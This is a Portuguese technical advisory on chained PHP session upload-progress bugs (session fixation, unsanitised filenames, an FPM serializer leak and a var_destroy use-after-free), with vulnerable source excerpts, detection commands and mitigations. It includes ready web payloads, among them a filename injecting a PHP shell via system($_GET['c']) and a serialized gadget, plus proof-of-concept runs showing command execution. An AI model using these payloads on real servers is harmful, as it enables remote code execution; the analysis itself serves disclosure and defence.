# php2shell — Análise Técnica

**CVE-2026-109618 / CVE-2026-109619**
**Autor:** Michael D. Bullet  **Data:** 2026-10-21

---

## Superfície de ataque

`session.upload_progress.enabled = On` é o padrão desde PHP 5.4. O handler `php_session_rfc1867_callback` é registrado diretamente no SAPI e intercepta qualquer POST multipart que contenha o campo `PHP_SESSION_UPLOAD_PROGRESS` — antes de qualquer `session_start()`, antes de qualquer código da aplicação, sem autenticação.

Quatro bugs nesse caminho de código:

| Bug | Localização | Impacto |
|-----|-------------|---------|
| Fixação de sessão | `MULTIPART_EVENT_FORMDATA` aceita `PHPSESSID` do POST ignorando `use_only_cookies` | Atacante controla ID e path do arquivo de sessão |
| Filename sem sanitização | `add_assoc_string_ex(*data->filename)` armazena filename bruto | PHP code / objetos serializados injetados no arquivo de sessão |
| Leak de serializer | `PS(serializer)` não é zerado em `php_rshutdown_session_globals()` | Handler mismatch cross-request em FPM |
| UAF em `var_destroy` | `i_zval_ptr_dtor` linha 310 dispara `__destruct` sem `BG(serialize_lock)` | heap-use-after-free → execução arbitrária |

---

## Fixação de sessão — `use_only_cookies` ignorado

`session.use_only_cookies = On` é verificado por `session_start()`, mas o handler `rfc1867` usa caminho de código próprio:

```c
/* ext/session/session.c — MULTIPART_EVENT_FORMDATA */
if (name_len == progress->sname_len &&
    memcmp(data->name, PS(session_name), name_len) == 0) {
    zval_ptr_dtor(&progress->sid);
    ZVAL_STRINGL(&progress->sid, (*data->value), value_len);
    /* ← aceita PHPSESSID do corpo do POST, sem checar use_only_cookies */
}
```

O fix no PR #22113 adiciona `!PS(use_only_cookies) &&` antes da atribuição. Na versão vulnerável, o atacante define o SID via POST e o arquivo de sessão é criado em `session.save_path/sess_<SID_CONTROLADO>`.

**A diretiva `use_only_cookies` não tem efeito sobre o handler `rfc1867` nas versões afetadas.**

---

## Filename sem sanitização — injeção no arquivo de sessão

O handler armazena o filename do `Content-Disposition` diretamente no array de sessão:

```c
/* ext/session/session.c — MULTIPART_EVENT_FILE_START */
add_assoc_string_ex(&progress->current_file, "name",
                    sizeof("name") - 1, *data->filename);
/* ← sem validação, sem encoding, sem limite de tamanho */
```

O arquivo de sessão resultante contém o filename bruto. Para injetar código PHP:

```
Content-Disposition: form-data; name="f"; filename="<?php system($_GET['c']);?>"
```

Para injetar gadget para Chain C:

```
Content-Disposition: form-data; name="f"; filename="x|O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}"
```

**Qualquer byte que o atacante colocar no filename vai parar no arquivo de sessão sem modificação.**

---

## UAF em `var_destroy` — `__destruct` sem serialize_lock

`var_destroy` percorre a hash de destruição em duas fases. Na Phase 2, `i_zval_ptr_dtor` dispara `__destruct` de objetos sem que `BG(serialize_lock)` esteja ativo:

```c
/* ext/standard/var_unserializer.re */
void var_destroy(php_unserialize_data_t *var_hashx) {
    /* Phase 1: libera chunks de extensão */
    while (var_hash) {
        efree_size(var_hash, sizeof(var_entries));  /* linha 245 — FREE */
        var_hash = next;
    }
    /* Phase 2: percorre dtor chain */
    while (var_dtor_hash) {
        i_zval_ptr_dtor(zv);   /* linha 310 — __destruct dispara AQUI */
        /* BG(serialize_lock) == 0 → inner unserialize() é permitido    */
        /* R:1500 referencia chunk já liberado na Phase 1 → UAF          */
    }
}
```

O exploit acumula 2000+ entradas no `unserialize()` para estourar `VAR_ENTRIES_MAX` (1018), forçando a alocação de chunks de extensão. A chave duplicada move o objeto para a dtor list. A Phase 1 libera os chunks, a Phase 2 dispara `__destruct`, o `R:N` inner referencia a memória liberada, e heap spray reclaim reescreve o ponteiro do handler.

```bash
# ASAN confirma o UAF
docker exec php-asan-lab php poc/chain_b.php 2>&1 | grep -A4 "heap-use-after-free"
# ==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
# READ of size 8 at 0x... thread T0
#     #0 0x... in i_zval_ptr_dtor zend_variables.h:35
#     #1 0x... in var_destroy /ext/standard/var.c:310
```

**`BG(serialize_lock)` deveria impedir inner unserialize durante destruição — está zerado na Phase 2.**

---

## Leak de serializer em FPM — `PS(serializer)` persiste entre requests

`php_rshutdown_session_globals()` zera `PS(id)`, `PS(session_vars)` e `PS(http_session_vars)`, mas não zera `PS(serializer)`:

```c
/* ext/session/session.c */
static void php_rshutdown_session_globals(void) {
    zend_string_release(PS(id));          /* zerado */
    zval_ptr_dtor(&PS(session_vars));     /* zerado */
    /* PS(serializer) ← NÃO é zerado, persiste para o próximo request */
}
```

Em PHP-FPM, workers reutilizados carregam o serializer do request anterior. Se o request anterior usou `php_serialize` e o atual usa `php`, a sessão escrita com `php_serialize` é lida com o decoder `php` — condição necessária para Chain C.

**O leak é persistente por worker FPM até que o processo seja reciclado.**

---

## `__destruct` em falha de decode — Chain C

O decoder `php` encontra `|` no conteúdo do filename, desserializa o objeto, falha ao processar os bytes seguintes e retorna `FAILURE`. O `__destruct` já disparou antes do `return`:

```c
/* ext/session/session.c — PS_SERIALIZER_DECODE_FUNC(php) */
while (p < endptr) {
    /* encontra |, desserializa o valor */
    if (php_var_unserialize(&rv, &p, endptr, &var_hash)) {
        php_set_session_var(name, &rv, &var_hash);  /* objeto armazenado */
    } else {
        retval = FAILURE;
        goto break_outer_loop;
    }
}
break_outer_loop:
    PHP_VAR_UNSERIALIZE_DESTROY(var_hash);  /* ← __destruct dispara AQUI */
    return retval;                          /* FAILURE */
```

`session_start()` chama `php_session_cancel_decode()` para destruir `$_SESSION` após o FAILURE — mas `__destruct` **já rodou** durante o `var_hash` cleanup.

```bash
ruby poc/chain_c.rb
# [+] Mismatch confirmed in response warnings

docker exec php2shell-lab cat /tmp/destruct_triggered.txt
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**`__destruct` é executado no caminho de falha — o decode bem-sucedido não é pré-requisito para execução de código.**

---

## Detecção

```bash
# Verificar se upload_progress está ativo
php -r 'echo ini_get("session.upload_progress.enabled"), PHP_EOL;'

# Identificar handler mismatch por diretório
find /var/www -name ".user.ini" -exec grep -l "serialize_handler" {} \;

# Monitorar tentativas de exploração nos logs
grep "PHP_SESSION_UPLOAD_PROGRESS" /var/log/nginx/access.log
```

---

## Mitigação

```ini
; Desativa o handler vulnerável (quebra UI de progresso de upload)
session.upload_progress.enabled = Off

; Endurecimento adicional
session.use_only_cookies = On
session.use_strict_mode = On
session.serialize_handler = php_serialize  ; handler consistente entre diretórios
```

Desativar `upload_progress` **não corrige** o UAF de `var_destroy` nem o leak de serializer em FPM. O patch oficial é necessário para Chain B.

---

## Versões afetadas

| Versão | Vulnerável | Fix |
|--------|------------|-----|
| PHP 5.4 — 5.6 | Sim | EOL, sem patch |
| PHP 7.0 — 7.4 | Sim | EOL, sem patch |
| PHP 8.0 — 8.1 | Sim | EOL, sem patch |
| PHP 8.2.0 — 8.2.34 | Sim | 8.2.35 |
| PHP 8.3.0 — 8.3.35 | Sim | 8.3.36 |
| PHP 8.4.0 — 8.4.26 | Sim | 8.4.27 |
| PHP 8.5.0 — 8.5.11 | Sim | 8.5.12 |

O código vulnerável é idêntico em todas as versões desde PHP 5.4.0 (2012).

---

## Referências

- [PR #22113 — session fixation fix](https://github.com/php/php-src/pull/22113)
- [Calif.IO — Serializable UAF](https://calif.io/research/php-uaf)
- [dinosn — var_destroy UAF](https://github.com/dinosn/php-8.5.5-var_destroy-uaf)
- [PHP Bug #71101 — handler mismatch](https://bugs.php.net/bug.php?id=71101)
- [cnpanda — handler mismatch exploitation](https://www.cnpanda.net/en/sec/580.html)
